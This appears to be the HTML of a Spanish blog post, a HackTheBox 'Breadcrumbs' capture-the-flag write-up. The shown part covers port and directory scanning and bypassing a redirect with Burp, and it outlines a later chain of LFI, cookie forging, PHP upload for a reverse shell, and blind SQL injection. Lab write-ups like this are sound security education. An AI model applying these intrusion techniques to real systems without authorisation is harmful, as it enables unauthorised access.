@@ -1,0 +1,2402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Breadcrumbs</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Breadcrumbs | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Breadcrumbs" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel difícil. Jugaremos mucho con inyecciones y robos :P Encontraremos un LFI, haremos cookie-hijacking, leeremos contraseñas almacenadas, jugando con binarios encontramos una URL que nos llevara de la mano a un SQLi y haremos desencriptación con claves AES." />
+<meta property="og:description" content="Máquina Windows nivel difícil. Jugaremos mucho con inyecciones y robos :P Encontraremos un LFI, haremos cookie-hijacking, leeremos contraseñas almacenadas, jugando con binarios encontramos una URL que nos llevara de la mano a un SQLi y haremos desencriptación con claves AES." />
+<link rel="canonical" href="http://localhost:4000/htb/breadcrumbs" />
+<meta property="og:url" content="http://localhost:4000/htb/breadcrumbs" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-07-17T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316banner.png" />
+<meta property="twitter:title" content="HackTheBox - Breadcrumbs" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-07-17T00:00:00-07:00","datePublished":"2021-07-17T00:00:00-07:00","description":"Máquina Windows nivel difícil. Jugaremos mucho con inyecciones y robos :P Encontraremos un LFI, haremos cookie-hijacking, leeremos contraseñas almacenadas, jugando con binarios encontramos una URL que nos llevara de la mano a un SQLi y haremos desencriptación con claves AES.","headline":"HackTheBox - Breadcrumbs","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/breadcrumbs"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/breadcrumbs"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Breadcrumbs</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-07-17">17 Jul 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316banner.png" alt="HackTheBox - Breadcrumbs">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Windows nivel difícil. Jugaremos mucho con inyecciones y robos :P Encontraremos un <strong>LFI</strong>, haremos <strong>cookie-hijacking</strong>, leeremos contraseñas almacenadas, jugando con binarios encontramos una <strong>URL</strong> que nos llevara de la mano a un <strong>SQLi</strong> y haremos desencriptación con claves <strong>AES</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316breadcrumbsHTB.png" alt="316breadcrumbsHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/163104">helich0pper</a>.</p>
+
+<p>¿Todo perfe?</p>
+
+<blockquote>
+  <p><strong>Se viene un laaargo writeup, pero es bastante practico y con cositas interesantes…</strong></p>
+</blockquote>
+
+<p>Máquina muuuuuy divertida, empezaremos encontrando un servicio web que nos permite (entre varias cosas) listar libros de una base de datos y subir archivos, pero solo si tenemos permisos de administrador. En vez de encontrar una vulnerabilidad <strong>SQL</strong> en el listado de libros encontraremos un <strong><em>LFI</em></strong> que nos permitirá ver archivos del sistema, usaremos esto para entender como tener permisos de administrador y subir el archivo.</p>
+
+<p>Validando nos daremos cuenta de que es necesario tener la sesión del usuario <strong>paul</strong> dentro del portal web; con esto en mente visitaremos el archivo que genera las cookies (<code>cookie.php</code>) para entenderlo y ver si podemos simular la sesión de <strong>paul</strong>. Y sí, vemos como se generan y despues de algo de jugueteo logramos obtener la cookie del usuario <code>paul</code>, la usaremos para obtener acceso como él en el sitio web.</p>
+
+<p>Despues de unos movimientos con <strong>tokens</strong> lograremos subir archivos al sitio, por medio de <strong>Burp</strong> podemos cambiar el contenido e incluso el nombre del archivo a subir, con esto lograremos subir un archivo <code>.php</code> para obtener ejecucion remota de comandos, generaremos una Reverse Shell para finalmente obtener una sesión como el usuario <strong>www-data</strong> (:</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/RCE_uploadPHPfile.py"><strong>RCE</strong> mediante el archivo <strong>.php</strong> (me gusto resto el script)</a>.</p>
+</blockquote>
+
+<p>Enumerando encontraremos unas credenciales para un servicio de pizza a domicilio :P el cual tiene info de <strong>juliette</strong>, que validando, es un usuario del sistema y con esas credenciales logramos su sesión por medio de <code>SSH</code>.</p>
+
+<p>En las “notas” de <strong>juliette</strong> encontraremos 3 tareas a realizar, pero que 1 nos llamara la atención, habla sobre el software <strong>Microsoft Sticky Notes</strong> y que es necesario migrar las contraseñas, ya que las guarda en texto plano”, con esto en mente lograremos (con ayuda de Google) encontrar la ruta donde se guardan estos archivos y efectivamente, encontraremos las credenciales de <strong>juliette</strong>, pero a la vez las del usuario <strong>development</strong>, las usaremos para migrarnos a su sesión.</p>
+
+<p>Encontraremos un binario algo inquietante que juega con llaves <strong>AES</strong>, revisando su contenido (<code>type &lt;file&gt;</code>) veremos que es tipo <strong>ELF</strong> y que tiene hardcodeada una <strong>URL</strong> con la que hace el juego de las llaves… La URL corre en el puerto <strong>1234</strong>, si jugamos con <code>cURL</code> e intentamos “explotarla” vemos respuesta por parte de <code>mysql</code>, nos apoyaremos de un <strong>Remote Port Forwarding</strong> para llevarnos el puerto <strong>1234</strong> a nuestra máquina y probar cositas, nos enfrentaremos a una inyección <strong>SQL blind</strong> que usaremos para extraer la password del usuario <strong>administrador</strong>.</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/breadcrumbs/process_SQLi"><strong>SQLi</strong>, fases para obtener la info de la base de datos</a>.</p>
+</blockquote>
+
+<p>Finalmente usaremos la columna <code>aes-key</code> (inicialmente nos la muestra como resultado de una ejecucion normal hacia la URL, pero también podemos extraerla con el <strong>SQLi</strong>) para desencriptar la password. Usando la contraseña desencriptada lograremos una sesión en la máquina como el usuario <strong>administrator</strong>.</p>
+
+<p>Mucho textoooooooooooo, a darle.</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>¿Que vamos a hacer?</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#movimiento-lateral-juliette">Movimiento Lateral Juliette</a>.</li>
+  <li><a href="#movimiento-lateral-dev">Movimiento Lateral Development</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Inicialmente haremos un escaneo de puertos para saber que servicios están activos en la máquina:</p>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v 10.10.10.228 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535.</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos.</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando.</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/Writeups/master/HTB/Magic/images/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard.</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat initScan 
+# Nmap 7.80 scan initiated Wed Mar 10 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.228
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.228 ()   Status: Up
+Host: 10.10.10.228 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, open/tcp//mysql///, 5040/open/tcp//unknown///, 7680/open/tcp//pando-pub///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp////, 49669/open/tcp/////
+# Nmap done at Wed Mar 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 74.39 seconds
+</code></pre>
+
+<p>Oko, tenemos varios puertos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Secure_Shell">SSH</a></strong>: Acceso a un servidor remoto por medio de un canal seguro.</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto">HTTP</a></strong>: Servidor web.</td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td style="text-align: left"><strong><a href="https://en.wikipedia.org/wiki/Port_135">RPC</a></strong>: Permite ejecutar procesos remotamente.</td>
+    </tr>
+    <tr>
+      <td>139</td>
+      <td style="text-align: left"><strong><a href="https://www.varonis.com/blog/smb-port/">SMB</a></strong>: Permite compartir información entre dispositivos de la misma red.</td>
+    </tr>
+    <tr>
+      <td>443</td>
+      <td style="text-align: left"><strong><a href="https://introbay.com/blog/https-que-es-y-para-que-sirve">HTTPS</a></strong>: Servidor web “seguro”.</td>
+    </tr>
+    <tr>
+      <td>445</td>
+      <td style="text-align: left"><strong><a href="https://www.varonis.com/blog/smb-port/">SMB</a></strong>: Permite compartir información entre dispositivos de la misma red.</td>
+    </tr>
+    <tr>
+      <td>3306</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/MySQL">MYSQL</a></strong>: Gestor de bases de datos.</td>
+    </tr>
+    <tr>
+      <td>7680</td>
+      <td style="text-align: left"><strong><a href="https://en.wikipedia.org/wiki/Pando_(application)">pando-pub</a></strong>: Aplicación para enviar archivos muy pesados.</td>
+    </tr>
+    <tr>
+      <td>5040/49664/49665</td>
+      <td style="text-align: left">No sabemos</td>
+    </tr>
+    <tr>
+      <td>49666/49667/49668/49669</td>
+      <td style="text-align: left">No sabemos</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora hagamos un escaneo de scripts y versiones con base en cada servicio (puerto) encontrado, asi validamos a profundidad cada uno:</p>
+
+<pre><code class="language-bash">❭ nmap -p 22,80,135,139,443,445,3306,5040,7680,49664,49665,49666,49667,49668,49669 -sC -sV 10.10.10.228 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat portScan
+# Nmap 7.80 scan initiated Wed Mar 10 25:25:25 2021 as: nmap -p 22,80,135,139,443,445,3306,5040,7680,49664,49665,49666,49667,49668,49669 -sC -sV -oN portScan 10.10.10.228
+Nmap scan report for 10.10.10.228
+Host is up (0.12s latency).
+
+PORT      STATE SERVICE       VERSION
+22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+| ssh-hostkey:
+|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
+|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
+|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
+80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
+|_http-title: Library
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 
+|_http-title: Library
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_  http/1.1
+445/tcp   open  microsoft-ds?
+3306/tcp  open  mysql?
+| fingerprint-strings: 
+|   LANDesk-RC, NULL, SIPOptions, WMSRequest: 
+|_    Host '10.10.14.194' is not allowed to connect to this MariaDB server
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V=7.80%I=7%D=3/10%Time=60494628%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,4B,"G...............................................................
+...
+# Mucha info vacia
+...
+..............................................................x20server");
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 3m08s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-03-10T22:26:14
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Mar 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 181.68 seconds
+</code></pre>
+
+<p>Obtenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH for_Windows_7.7 (protocol 2.0)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache httpd 2.4.46</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">135</td>
+      <td style="text-align: left">RPC</td>
+      <td style="text-align: left">Microsoft Windows RPC</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">139</td>
+      <td style="text-align: left">SMB</td>
+      <td style="text-align: left">Microsoft Windows netbios-ssn</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">443</td>
+      <td style="text-align: left">HTTPS</td>
+      <td style="text-align: left">Apache httpd 2.4.46</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">445</td>
+      <td style="text-align: left">SMB</td>
+      <td style="text-align: left">Ni idea u.u</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">3306</td>
+      <td style="text-align: left">MYSQL</td>
+      <td style="text-align: left">MariaDB</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">7680</td>
+      <td style="text-align: left">PANDO</td>
+      <td style="text-align: left">No sabe ._ .</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">…</td>
+      <td style="text-align: left">Unknown</td>
+      <td style="text-align: left">Unknown</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Pues démosle a los servicios y veamos por donde podemos empezar a romper :O</p>
+
+<p>…</p>
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">⌖</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80.png" alt="316page80" /></p>
+
+<p>Bien, simplemente obtenemos lo que parece ser un simulador de librería, si nos fijamos hay un botón que nos redirecciona a <code>/php/books.php</code>, veamos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_php_booksPHP.png" alt="316page80_php_booksPHP" /></p>
+
+<p>Jmmm, un buscador de libros intuyo, podemos buscar por título y por autor, si buscamos por cualquier letra nos filtra varios libros (claramente dependiendo de la letra :P), como por ejemplo buscando en el título la letra <code>a</code>, tenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_php_booksPHP_searchTitle_a.png" alt="316page80_php_booksPHP_searchTitle_a" /></p>
+
+<p>Enumerando el código fuente, vemos la ruta “<code>http://10.10.10.228/js/books.js</code>” que es la que procesa lo que hagamos en la web de los libros, asi mismo vemos en algunas partes del <strong>JavaScript</strong> el llamado de otro script:</p>
+
+<ul>
+  <li><code>../includes/bookController.php</code>.</li>
+</ul>
+
+<p>Asi que tenemos otra ruta para enumerar, <code>/includes</code>. Esto me dio la idea de hacer un escaneo rápido con <strong>nmap</strong> para ver que recursos no están a la vista sobre el servidor web del puerto 80:</p>
+
+<pre><code class="language-bash">❭ nmap -p 80 --script=http-enum 10.10.10.228 -oN webScan
+</code></pre>
+
+<pre><code class="language-bash">❭ cat webScan 
+# Nmap 7.80 scan initiated Wed Mar 10 25:25:25 2021 as: nmap -p 80 --script=http-enum -oN webScan 10.10.10.228
+Nmap scan report for 10.10.10.228
+Host is up (0.12s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /db/: BlogWorx Database
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
+|   /db/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
+|   /icons/: Potentially interesting folder w/ directory listing
+|   /includes/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
+|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
+|_  /php/: Potentially interesting directory w/ listing on 'apache/2.4.46 (win64) openssl/1.1.1h php/8.0.1'
+
+# Nmap done at Wed Mar 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 27.39 seconds
+</code></pre>
+
+<p>Bien, algo que me llamo la atención fue la descripción de la carpeta <code>/db/</code>:</p>
+
+<ul>
+  <li><strong>BlogWorx Database</strong>.</li>
+</ul>
+
+<p>Que si buscamos en internet, nos muestra exploits viejos relacionados con <code>SQLi</code> sobre ese servicio, pero probando con el archivo que esta dentro de esa carpeta (<code>/db/db.php</code>) no conseguimos nada… <strong><em>Para tenerlo en cuenta.</em></strong></p>
+
+<p>Si validamos el contenido del servicio <code>HTTPS (443)</code> vemos el mismo contenido que el del puerto <code>80</code>…</p>
+
+<p>Haciendo un escaneo con <code>dirsearch</code> encontramos nuevos directorios:</p>
+
+<pre><code class="language-bash">❭ dirsearch.py -u http://10.10.10.228/ -q
+...
+302 -    0B  - http://10.10.10.228/portal/  -&gt;  login.php
+...
+</code></pre>
+
+<p>Validando, efectivamente tenemos un login y también la opción de registrarnos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_portal_login.png" alt="316page80_portal_login" /></p>
+
+<p>En esta pantalla ya tenemos un redireccionamiento (en <code>helper</code>) a un archivo llamado <code>/admins.php</code> el cual tiene varios usuarios potenciales para tener en cuenta:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_portal_php_admins.png" alt="316page80_portal_php_admins" /></p>
+
+<p>Despues de registrarnos y entrar al “portal” tenemos:</p>
+
+<blockquote>
+  <p>(Menu desplegable arriba a la derecha)</p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_portal_dashboard_menu.png" alt="316page80_portal_dashboard_menu" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_portal_dashboard.png" alt="316page80_portal_dashboard" /></p>
+
+<p>Contamos con <strong>4</strong> botones, veamos <code>Check tasks</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_portal_php_issues.png" alt="316page80_portal_php_issues" /></p>
+
+<p>Interesante… Relaciona todos los problemas que necesitan arreglar tanto en la web como en la compañia… Lo que nos damos cuenta con el ultimo problema es que si validamos la opcion <code>logout</code> del menu desplegable claramente hay un problema con su ejecución:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_portal_auth_logout_err.png" alt="316page80_portal_auth_logout_err" /></p>
+
+<p>Bien, por ahora sigamos enumerando los recursos… Si vemos el botón <code>Order pizza</code> obtenemos el mensaje:</p>
+
+<blockquote>
+  <p>Disabled for economical reasons</p>
+</blockquote>
+
+<p>:P</p>
+
+<p>Validando el botón <code>User management</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page80_portal_php_users.png" alt="316page80_portal_php_users" /></p>
+
+<p>Vemos también varios usuarios, la mayoría ya los habíamos visto en el anterior recurso, pero en este encuentro tenemos sus roles y además 3 nuevos usuarios:</p>
+
+<ul>
+  <li><code>sirine</code> -&gt; Reception.</li>
+  <li><code>juliette</code> -&gt; Server Admin.</li>
+  <li><code>support</code> -&gt; -.</li>
+</ul>
+
+<p>De los 3 <code>juliette</code> es interesante, tengámosla presente por si algo, sigamos.</p>
+
+<p>Si validamos el último botón (<strong>File management</strong>) nos llevaría al recurso <code>/files.php</code>, pero al dar clic tenemos un redireccionamiento a <code>/index.php</code>… Si jugamos con <strong>BurpSuite</strong> podemos interceptar la petición antes de que nos redireccione para ver que contenido tiene realmente, esto jugando con el código de estado, pasándolo de <strong>302 (Found)</strong> a <strong>200 (Ok)</strong>, hagámoslo rápidamente:</p>
+
+<p>Primero habilitamos en las opciones del <strong>proxy</strong> el ítem para interceptar las respuestas:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_enable_proxy_response_intercept.png" alt="316burp_enable_proxy_response_intercept" /></p>
+
+<p>Ahora, lanzamos la petición desde la web y la interceptamos en <code>Burp</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_proxy_intercept_on.png" alt="316burp_proxy_intercept_on" /></p>
+
+<p>Damos clic en <code>Forward</code> y obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_proxy_intercept_forward.png" alt="316burp_proxy_intercept_forward" /></p>
+
+<p>Ahora simplemente modificamos el <strong>status code</strong> de <code>302</code> a <code>200</code> y damos clic en <code>Forward</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_proxy_intercept_sCode_200.png" alt="316burp_proxy_intercept_sCode_200" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316page_portal_php_files.png" alt="316page_portal_php_files" /></p>
+
+<p>Bien, tenemos un apartado para subir archivos <code>.zip</code>, pero si intentamos subir algo obtenemos:</p>
+
+<blockquote>
+  <p>Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.</p>
+</blockquote>
+
+<p>Asi ees como viaja la petición:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316burp_req_fileupload.png" alt="316burp_req_fileupload" /></p>
+
+<p>Y este es el archivo (<code>/portal/assets/js/files.js</code>) que procesa la petición:</p>
+
+<pre><code class="language-js">$(document).ready(function(){
+    $("#upload").click(function(){
+        var formData = new FormData();
+        formData.append('file', $('#file')[0].files[0]);
+        formData.append('task', $('#task').val() + ".zip");
+        post(formData);
+        formData = null;
+    })
+});
+
+
+function post(formData){
+    jQuery.ajax({
+        url: "../includes/fileController.php",
+        type: "POST",
+        processData: false,
+        contentType: false,
+        data: formData,
+        success: function(res){
+            $("#message").html(res);
+        }
+    });
+}
+</code></pre>
+
+<p>No sé por qué dice “upload code” siempre, pero bueno esa es la respuesta. También entiendo que no podemos subir nada por el status que tenemos desde el inicio que dice <code>Role: Awaiting approval</code>, asi que por ahora no podremos hacer nada con esto…</p>
+
+<p>Si queremos mantener la opción hecha en <code>Burp</code> sobre el status code, podemos crear una regla para que cada vez que llegue un status code de <code>302</code> nos lo cambie por <code>200</code>:</p>
+
+<ul>
